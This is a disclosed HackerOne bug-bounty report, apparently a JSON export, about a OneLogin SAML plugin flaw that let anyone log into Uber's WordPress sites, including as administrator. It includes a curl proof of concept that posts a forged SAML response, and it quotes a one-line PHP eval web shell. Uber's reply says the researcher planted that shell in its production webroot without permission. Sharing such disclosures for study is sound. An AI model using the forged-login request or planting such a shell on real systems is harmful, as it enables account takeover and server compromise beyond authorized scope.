{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2016-05-07T09:53:44.840Z", 
    "voters": [
        "jobert", 
        "stefanofinding", 
        "michiel", 
        "jouko", 
        "hunter", 
        "troubleshooter", 
        "zombiehelp54", 
        "bogdantcaciuc", 
        "secalert", 
        "glc", 
        "and 28 more..."
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "10000.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 136169, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": null, 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "OneLogin authentication bypass on WordPress sites", 
    "is_member_of_team?": null, 
    "vote_count": 38, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2016-06-06T09:53:44.967Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$10,000", 
    "attachments": [
        {
            "file_name": "newsroom.png", 
            "type": "image/png", 
            "id": 91386, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/091/386/94aa2135022d5eadc88e487a9788589632f8640a/newsroom.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ74T23ZH2%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T225344Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDKP8gtonlolbwRCFkSK3A8zRiM4XrfrPxhuRQyPzGewY%2F8%2BrZubJgueFivdcxl7%2F3iKHqTcriXEfjKl%2BSTmdTrFI3DombVHMKOYwlG1hM21jXAfSh72gDN%2BHds5TF5Hko27v6DRiCzuemhdgF47giYHnyCL3NCtcZ280H43hMDk8jiMZIUa5jSGS%2FYM0UQD2eITjNKscKu9Fg3jnQOs%2FtI0LbTq4ZOYkHzJsx3Gx5wmY15OB78PVb%2FoanvGsdZ1G6JLoOvoTJtP%2BBGbZSfLbuJ1WmFVnDe95bwaZBXmmNFIwMDxV%2BIfpWj4A6egpifpz3xxmRRWcE1dqWPIhLKaatOintqSYA20U00rLoCNdGd9IKmu0qa6%2B8Nt35qrWRxLjUKFoVkfzI8plSmUmq%2B7hZ71fbl9wB5sUhWpjZP521spZTb6QY8FJEa8S3BRJSDNUSr0ecK5GZt3wvmq5ONCWAeZbidiSFNHoYpY72e9tiuClRIfQzkSOa7JE0OSN9ATAt8rjzLAGibK5D8CP7%2F23wI%2Fce9%2BQ7jYxhSDeUleT1ird2slt6z2voHzFGPzgGkupeiNthV4QvkyXxyIQFGYYyeRDJ%2FnjD%2Boo666m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7aca40591d13f16bd5de781efedaf8515caef9fa6f0100c4309e2ccb2edec015"
        }, 
        {
            "file_name": "newsroom3.png", 
            "type": "image/png", 
            "id": 91387, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/091/387/fad82e776d93c2695a14567f5357bc86f4e1a021/newsroom3.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ74T23ZH2%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T225344Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDKP8gtonlolbwRCFkSK3A8zRiM4XrfrPxhuRQyPzGewY%2F8%2BrZubJgueFivdcxl7%2F3iKHqTcriXEfjKl%2BSTmdTrFI3DombVHMKOYwlG1hM21jXAfSh72gDN%2BHds5TF5Hko27v6DRiCzuemhdgF47giYHnyCL3NCtcZ280H43hMDk8jiMZIUa5jSGS%2FYM0UQD2eITjNKscKu9Fg3jnQOs%2FtI0LbTq4ZOYkHzJsx3Gx5wmY15OB78PVb%2FoanvGsdZ1G6JLoOvoTJtP%2BBGbZSfLbuJ1WmFVnDe95bwaZBXmmNFIwMDxV%2BIfpWj4A6egpifpz3xxmRRWcE1dqWPIhLKaatOintqSYA20U00rLoCNdGd9IKmu0qa6%2B8Nt35qrWRxLjUKFoVkfzI8plSmUmq%2B7hZ71fbl9wB5sUhWpjZP521spZTb6QY8FJEa8S3BRJSDNUSr0ecK5GZt3wvmq5ONCWAeZbidiSFNHoYpY72e9tiuClRIfQzkSOa7JE0OSN9ATAt8rjzLAGibK5D8CP7%2F23wI%2Fce9%2BQ7jYxhSDeUleT1ird2slt6z2voHzFGPzgGkupeiNthV4QvkyXxyIQFGYYyeRDJ%2FnjD%2Boo666m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=36231089a69bef6d48fe30ffa278fb3b8ff0858774d4db5adb25ed614d670391"
        }
    ], 
    "singular_disclosure_disabled": true, 
    "activities": [
        {
            "attachments": [
                {
                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/091/390/cb43b0818ab6d32477cb571801e7b00e8a9603bc/newsroom2.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ74T23ZH2%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T225344Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDKP8gtonlolbwRCFkSK3A8zRiM4XrfrPxhuRQyPzGewY%2F8%2BrZubJgueFivdcxl7%2F3iKHqTcriXEfjKl%2BSTmdTrFI3DombVHMKOYwlG1hM21jXAfSh72gDN%2BHds5TF5Hko27v6DRiCzuemhdgF47giYHnyCL3NCtcZ280H43hMDk8jiMZIUa5jSGS%2FYM0UQD2eITjNKscKu9Fg3jnQOs%2FtI0LbTq4ZOYkHzJsx3Gx5wmY15OB78PVb%2FoanvGsdZ1G6JLoOvoTJtP%2BBGbZSfLbuJ1WmFVnDe95bwaZBXmmNFIwMDxV%2BIfpWj4A6egpifpz3xxmRRWcE1dqWPIhLKaatOintqSYA20U00rLoCNdGd9IKmu0qa6%2B8Nt35qrWRxLjUKFoVkfzI8plSmUmq%2B7hZ71fbl9wB5sUhWpjZP521spZTb6QY8FJEa8S3BRJSDNUSr0ecK5GZt3wvmq5ONCWAeZbidiSFNHoYpY72e9tiuClRIfQzkSOa7JE0OSN9ATAt8rjzLAGibK5D8CP7%2F23wI%2Fce9%2BQ7jYxhSDeUleT1ird2slt6z2voHzFGPzgGkupeiNthV4QvkyXxyIQFGYYyeRDJ%2FnjD%2Boo666m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7b1902d97de072e88391e5c1871e2257df9c63ad7768f5c7a76b2314860be51c", 
                    "type": "image/png", 
                    "id": 91390, 
                    "filename": "newsroom2.png"
                }
            ], 
            "automated_response": false, 
            "created_at": "2016-05-04T07:31:16.815Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-04T07:31:16.815Z", 
            "actor": {
                "username": "jouko", 
                "url": "/jouko", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/642/ac126b9d3c3ae610b07da9ea3070cf3f55d55aff_medium.jpg?1423004250"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Admin Dashboard", 
            "markdown_message": "<p>Admin Dashboard</p>\n", 
            "type": "Activities::Comment", 
            "id": 939820, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-04T16:08:17.897Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-04T16:08:17.897Z", 
            "actor": {
                "username": "mandatoryuber", 
                "url": "/mandatoryuber", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/040/287/d8b3fb7946b40427a07c98958bf2081bbd60daec_medium.jpeg?1442852902"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Yikes, that's not good - investigating this now.", 
            "markdown_message": "<p>Yikes, that&#39;s not good - investigating this now.</p>\n", 
            "type": "Activities::Comment", 
            "id": 940435, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-04T16:15:21.852Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-04T16:15:21.852Z", 
            "actor": {
                "username": "mandatoryuber", 
                "url": "/mandatoryuber", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/040/287/d8b3fb7946b40427a07c98958bf2081bbd60daec_medium.jpeg?1442852902"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Triaging, we should have a response on this later today.", 
            "markdown_message": "<p>Triaging, we should have a response on this later today.</p>\n", 
            "type": "Activities::BugTriaged", 
            "id": 940439, 
            "genius_execution_id": null
        }, 
        {
            "attachments": [
                {
                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/091/480/35bfd373c78ee41bacc5aa480566f09a26b0ed7f/newsroom5.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ74T23ZH2%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T225344Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDKP8gtonlolbwRCFkSK3A8zRiM4XrfrPxhuRQyPzGewY%2F8%2BrZubJgueFivdcxl7%2F3iKHqTcriXEfjKl%2BSTmdTrFI3DombVHMKOYwlG1hM21jXAfSh72gDN%2BHds5TF5Hko27v6DRiCzuemhdgF47giYHnyCL3NCtcZ280H43hMDk8jiMZIUa5jSGS%2FYM0UQD2eITjNKscKu9Fg3jnQOs%2FtI0LbTq4ZOYkHzJsx3Gx5wmY15OB78PVb%2FoanvGsdZ1G6JLoOvoTJtP%2BBGbZSfLbuJ1WmFVnDe95bwaZBXmmNFIwMDxV%2BIfpWj4A6egpifpz3xxmRRWcE1dqWPIhLKaatOintqSYA20U00rLoCNdGd9IKmu0qa6%2B8Nt35qrWRxLjUKFoVkfzI8plSmUmq%2B7hZ71fbl9wB5sUhWpjZP521spZTb6QY8FJEa8S3BRJSDNUSr0ecK5GZt3wvmq5ONCWAeZbidiSFNHoYpY72e9tiuClRIfQzkSOa7JE0OSN9ATAt8rjzLAGibK5D8CP7%2F23wI%2Fce9%2BQ7jYxhSDeUleT1ird2slt6z2voHzFGPzgGkupeiNthV4QvkyXxyIQFGYYyeRDJ%2FnjD%2Boo666m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=35ec0ca655c492c60d5de18d19985f9cbba24cbe34192ba12d373637b28b61fe", 
                    "type": "image/png", 
                    "id": 91480, 
                    "filename": "newsroom5.png"
                }
            ], 
            "automated_response": false, 
            "created_at": "2016-05-04T16:53:25.228Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-04T16:53:25.228Z", 
            "actor": {
                "username": "jouko", 
                "url": "/jouko", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/642/ac126b9d3c3ae610b07da9ea3070cf3f55d55aff_medium.jpg?1423004250"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "The screenshots show a PoC of getting site admin, but logging on with a Network/Super Admin's email address (which was visible in the users list) grants that privilege and more attack surface.\n\nWhile I was there I also tested the WPEngine RCE vector that has remained unconfirmed by you, reported at #134907. Although the system() PHP function didn't directly work, I was able to create a PHP script with arbitrary contents under the webroot. This would allow full control of the databases, reading or writing any file as the www-data user, inside or outside webroot, installing PHP backdoors/shells, access to all web traffic, etc.\n", 
            "markdown_message": "<p>The screenshots show a PoC of getting site admin, but logging on with a Network/Super Admin&#39;s email address (which was visible in the users list) grants that privilege and more attack surface.</p>\n\n<p>While I was there I also tested the WPEngine RCE vector that has remained unconfirmed by you, reported at <a href=\"/reports/134907\">#134907</a>. Although the system() PHP function didn&#39;t directly work, I was able to create a PHP script with arbitrary contents under the webroot. This would allow full control of the databases, reading or writing any file as the www-data user, inside or outside webroot, installing PHP backdoors/shells, access to all web traffic, etc.</p>\n", 
            "type": "Activities::Comment", 
            "id": 940502, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "jouko", 
                "url": "/jouko"
            }, 
            "created_at": "2016-05-04T16:56:25.090Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-04T16:56:25.090Z", 
            "actor": {
                "username": "mandatoryuber", 
                "url": "/mandatoryuber", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/040/287/d8b3fb7946b40427a07c98958bf2081bbd60daec_medium.jpeg?1442852902"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Hey @jouko this should now be patched for `newsroom.uber.com` (I just hotpatched it in prod) can you confirm the fix? We're investigating the rest of our WP instances now to see if this is systemic.", 
            "markdown_message": "<p>Hey <a href=\"/jouko\">@jouko</a> this should now be patched for <code>newsroom.uber.com</code> (I just hotpatched it in prod) can you confirm the fix? We&#39;re investigating the rest of our WP instances now to see if this is systemic.</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 940505, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-04T16:57:30.618Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-04T16:57:30.618Z", 
            "actor": {
                "username": "mandatoryuber", 
                "url": "/mandatoryuber", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/040/287/d8b3fb7946b40427a07c98958bf2081bbd60daec_medium.jpeg?1442852902"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "What was the PHP script you created?", 
            "markdown_message": "<p>What was the PHP script you created?</p>\n", 
            "type": "Activities::Comment", 
            "id": 940506, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-04T17:18:09.951Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-04T17:18:09.951Z", 
            "actor": {
                "username": "jouko", 
                "url": "/jouko", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/642/ac126b9d3c3ae610b07da9ea3070cf3f55d55aff_medium.jpg?1423004250"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "https://newsroom.uber.com/bugb.php", 
            "markdown_message": "<p><a title=\"https://newsroom.uber.com/bugb.php\" href=\"/redirect?signature=17249cd06d2cb44c9c72c15e16100e8276ea9d51&amp;url=https%3A%2F%2Fnewsroom.uber.com%2Fbugb.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://newsroom.uber.com/bugb.php</span><i class=\"icon-external-link\"></i></a></p>\n", 
            "type": "Activities::Comment", 
            "id": 940526, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-04T17:19:10.114Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-04T17:19:10.114Z", 
            "actor": {
                "username": "jouko", 
                "url": "/jouko", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/642/ac126b9d3c3ae610b07da9ea3070cf3f55d55aff_medium.jpg?1423004250"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Yes seems to be patched now.", 
            "markdown_message": "<p>Yes seems to be patched now.</p>\n", 
            "type": "Activities::Comment", 
            "id": 940529, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-04T17:24:38.331Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-04T17:24:38.331Z", 
            "actor": {
                "username": "mandatoryuber", 
                "url": "/mandatoryuber", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/040/287/d8b3fb7946b40427a07c98958bf2081bbd60daec_medium.jpeg?1442852902"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Nice, I'll triage the other report shortly as well.", 
            "markdown_message": "<p>Nice, I&#39;ll triage the other report shortly as well.</p>\n", 
            "type": "Activities::Comment", 
            "id": 940540, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-05T21:28:11.641Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-05T21:28:11.641Z", 
            "actor": {
                "username": "notcollin", 
                "url": "/notcollin", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": ">First, I'm sorry about reporting another WordPress bug\n\nAs a small comment @jouko please dont be sorry, we very much want any reports (especially from you as an articulate reporter). We just had to be clear about what we saw as impact for wordpress issue. ", 
            "markdown_message": "<blockquote>\n<p>First, I&#39;m sorry about reporting another WordPress bug</p>\n</blockquote>\n\n<p>As a small comment <a href=\"/jouko\">@jouko</a> please dont be sorry, we very much want any reports (especially from you as an articulate reporter). We just had to be clear about what we saw as impact for wordpress issue. </p>\n", 
            "type": "Activities::Comment", 
            "id": 942919, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-07T09:53:44.901Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-07T09:53:44.901Z", 
            "actor": {
                "username": "jouko", 
                "url": "/jouko", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/642/ac126b9d3c3ae610b07da9ea3070cf3f55d55aff_medium.jpg?1423004250"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 945075, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2016-05-09T22:18:47.189Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-09T22:18:47.189Z", 
            "actor": {
                "url": "/uber", 
                "profile": {
                    "name": "Uber"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/314/0010251d7088db2a1b236eb594b6371af4492609_medium.png?1514905146"
                }
            }, 
            "team_handle": "uber", 
            "bounty_amount": "10000.0", 
            "collaborator": {
                "username": "jouko", 
                "url": "/jouko"
            }, 
            "message": "Hey @jouko we're rewarding our max bounty for this one due to the chain with the shared JavaScript with `team.uberinternal.com`. We recognized the chained JavaScript source elevates the impact in this case (and rewarded this bug accordingly).\n\nOne important thing we'd like to add is that during the investigation of the issue we noticed that you placed an unauthenticated web shell into our web root (`bugb.php`) which could've been used by other malicious users to compromise our website:\n```php\n<?php eval($_POST[\"php\"]);?>\n```\nWe'd like to let you know that this is **not** an allowed action and future actions of this nature can result in removal from the program and was not necessary to demonstrate remote code execution on the server.", 
            "markdown_message": "<p>Hey <a href=\"/jouko\">@jouko</a> we&#39;re rewarding our max bounty for this one due to the chain with the shared JavaScript with <code>team.uberinternal.com</code>. We recognized the chained JavaScript source elevates the impact in this case (and rewarded this bug accordingly).</p>\n\n<p>One important thing we&#39;d like to add is that during the investigation of the issue we noticed that you placed an unauthenticated web shell into our web root (<code>bugb.php</code>) which could&#39;ve been used by other malicious users to compromise our website:</p>\n<pre class=\"highlight php\"><code><span class=\"cp\">&lt;?php</span> <span class=\"k\">eval</span><span class=\"p\">(</span><span class=\"nv\">$_POST</span><span class=\"p\">[</span><span class=\"s2\">&quot;php&quot;</span><span class=\"p\">]);</span><span class=\"cp\">?&gt;</span>\n</code></pre>\n<p>We&#39;d like to let you know that this is <strong>not</strong> an allowed action and future actions of this nature can result in removal from the program and was not necessary to demonstrate remote code execution on the server.</p>\n", 
            "type": "Activities::BountyAwarded", 
            "id": 947937, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-09T23:36:21.145Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-09T23:36:21.145Z", 
            "actor": {
                "username": "jouko", 
                "url": "/jouko", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/642/ac126b9d3c3ae610b07da9ea3070cf3f55d55aff_medium.jpg?1423004250"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Thanks. I'd like to make it clear that there was nothing malicious about placing the script. As you can read above, I notified you about creating it right away. It seemed necessary in context of report #134907.\n\nYou had previously lowered my bounties based e.g. on the assumption (as I was told weeks later) that my reports were wrong and RCE was actually not possible via admin XSS on WPEngine. Solving this question was the purpose of report #134907.\n\nI expected you could still continue arguing that RCE wasn't possible because I had \"only\" demonstrated evaluating arbitrary PHP and dangerous PHP functions are supposedly disabled on WPEngine. It seemed important to find a bug in that interface too in order to demonstrate proper RCE.\n\nI thought creating this kind of script was the simplest, safest, and least intrusive way to test various PHP functions. It's true that someone *could* have guessed the path of the script and the parameter it requires, but this didn't seem realistic, especially within the short time frame I expected to need it. As you quickly removed it however, I continued experimenting on a WPEngine instance which I set up on my own expense. \n", 
            "markdown_message": "<p>Thanks. I&#39;d like to make it clear that there was nothing malicious about placing the script. As you can read above, I notified you about creating it right away. It seemed necessary in context of report <a href=\"/reports/134907\">#134907</a>.</p>\n\n<p>You had previously lowered my bounties based e.g. on the assumption (as I was told weeks later) that my reports were wrong and RCE was actually not possible via admin XSS on WPEngine. Solving this question was the purpose of report <a href=\"/reports/134907\">#134907</a>.</p>\n\n<p>I expected you could still continue arguing that RCE wasn&#39;t possible because I had &quot;only&quot; demonstrated evaluating arbitrary PHP and dangerous PHP functions are supposedly disabled on WPEngine. It seemed important to find a bug in that interface too in order to demonstrate proper RCE.</p>\n\n<p>I thought creating this kind of script was the simplest, safest, and least intrusive way to test various PHP functions. It&#39;s true that someone <em>could</em> have guessed the path of the script and the parameter it requires, but this didn&#39;t seem realistic, especially within the short time frame I expected to need it. As you quickly removed it however, I continued experimenting on a WPEngine instance which I set up on my own expense. </p>\n", 
            "type": "Activities::Comment", 
            "id": 948045, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-13T14:59:13.072Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-13T14:59:13.072Z", 
            "actor": {
                "username": "jouko", 
                "url": "/jouko", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/642/ac126b9d3c3ae610b07da9ea3070cf3f55d55aff_medium.jpg?1423004250"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "FYI I was writing a note to Onelogin but then noticed that this bug doesn't affect the latest versions. I tried to track the fix on Github. Apparently [this](https://github.com/onelogin/wordpress-saml/commit/b102b16ce29ed92d2c4677ca491c6bbe33ee25fa) patch addresses the bug but Onelogin (or anyone else) hasn't mentioned the vulnerability in public as far as I can see.", 
            "markdown_message": "<p>FYI I was writing a note to Onelogin but then noticed that this bug doesn&#39;t affect the latest versions. I tried to track the fix on Github. Apparently <a href=\"/redirect?signature=8faf1a8ae2897108e98e12393d5b14b784d2741c&amp;url=https%3A%2F%2Fgithub.com%2Fonelogin%2Fwordpress-saml%2Fcommit%2Fb102b16ce29ed92d2c4677ca491c6bbe33ee25fa\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>this</span><i class=\"icon-external-link\"></i></a> patch addresses the bug but Onelogin (or anyone else) hasn&#39;t mentioned the vulnerability in public as far as I can see.</p>\n", 
            "type": "Activities::Comment", 
            "id": 955860, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-06T09:54:01.282Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-06T09:54:01.282Z", 
            "actor": {
                "url": "/uber", 
                "profile": {
                    "name": "Uber"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/314/0010251d7088db2a1b236eb594b6371af4492609_medium.png?1514905146"
                }
            }, 
            "team_handle": "uber", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 1000832, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "jouko", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/jouko", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/013/642/84ded716b305011af6c7091e630ca8ac2c590a87_small.jpg?1423004250"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 27, 
        "name": "Improper Authentication - Generic"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -78929999.13247408, 
    "disclosed_at": "2016-06-06T09:54:01.182Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/136169", 
    "created_at": "2016-05-04T07:29:37.558Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>First, I&#39;m sorry about reporting another WordPress bug (my intention was just to check if WP-OneLogin stores any sensitive info that could be used to attack OneLogin on your other websites).</p>\n\n<h1 id=\"overview\">Overview</h1>\n\n<p>The *.uber.com WordPress sites use OneLogin SAML-SSO instead of the normal WordPress login. The WordPress plugin shipped by OneLogin has a bug which allows anyone to login without a password or other authentication.</p>\n\n<p>The attacker can supply a username, email adress, name, and a role. If the username doesn&#39;t already exist in the WordPress database, then the plugin will create a new user (if the provisioning setting is on, which it was on the two sites I tested).</p>\n\n<p>It looks like in order to gain administrator privileges the attacker has to guess some information - a role name such as &quot;administrator&quot;, or the email address or username of an existing administrator.</p>\n\n<h1 id=\"poc\">PoC</h1>\n\n<p>I tried this on two sites. On eng.uber.com I couldn&#39;t guess a correct role name, user name, or email address to get administrator privileges and therefore was able to create only a &quot;subscriber&quot; level account. On newsroom.uber.com the role name apparently was simply &quot;administrator&quot; so I got that privilege on the system. Some other plugin settings may affect this behavior too.</p>\n\n<h1 id=\"reproducing\">Reproducing</h1>\n\n<p>An example shell script:</p>\n<pre class=\"highlight shell\"><code><span class=\"c\">#!/bin/sh</span>\n<span class=\"nv\">xml</span><span class=\"o\">=</span><span class=\"sb\">`</span>base64 response.xml<span class=\"sb\">`</span>\ncurl -v <span class=\"s1\">&#39;https://newsroom.uber.com/wp-content/plugins/onelogin-saml-sso/onelogin_saml.php?acs&#39;</span> <span class=\"se\">\\</span>\n    --data <span class=\"s2\">&quot;RelayState=/wp-login.php&quot;</span> --data-urlencode <span class=\"s2\">&quot;SAMLResponse=</span><span class=\"nv\">$xml</span><span class=\"s2\">&quot;</span>\n</code></pre>\n<p>The required file &quot;response.xml&quot; containing a SAML response:</p>\n<pre class=\"highlight xml\"><code><span class=\"nt\">&lt;samlp:Response</span> <span class=\"na\">xmlns:saml=</span><span class=\"s\">&quot;urn:oasis:names:tc:SAML:2.0:assertion&quot;</span> <span class=\"na\">xmlns:samlp=</span><span class=\"s\">&quot;urn:oasis:names:tc:SAML:2.0:protocol&quot;</span> <span class=\"na\">ID=</span><span class=\"s\">&quot;R0bdb6f33ef84425aa2782eab4483792762f297df&quot;</span> <span class=\"na\">Version=</span><span class=\"s\">&quot;2.0&quot;</span> <span class=\"na\">IssueInstant=</span><span class=\"s\">&quot;2016-05-04T01:37:34Z&quot;</span> <span class=\"na\">Destination=</span><span class=\"s\">&quot;&quot;</span> <span class=\"na\">InResponseTo=</span><span class=\"s\">&quot;ONELOGIN_bd24d63eafe235201b1bc636823c84381dbe575c&quot;</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;samlp:Status&gt;&lt;samlp:StatusCode</span> <span class=\"na\">Value=</span><span class=\"s\">&quot;urn:oasis:names:tc:SAML:2.0:status:Success&quot;</span><span class=\"nt\">/&gt;&lt;/samlp:Status&gt;</span>\n<span class=\"nt\">&lt;saml:Assertion</span> <span class=\"na\">xmlns:saml=</span><span class=\"s\">&quot;urn:oasis:names:tc:SAML:2.0:assertion&quot;</span> <span class=\"na\">xmlns:xs=</span><span class=\"s\">&quot;http://www.w3.org/2001/XMLSchema&quot;</span> <span class=\"na\">xmlns:xsi=</span><span class=\"s\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class=\"na\">Version=</span><span class=\"s\">&quot;2.0&quot;</span> <span 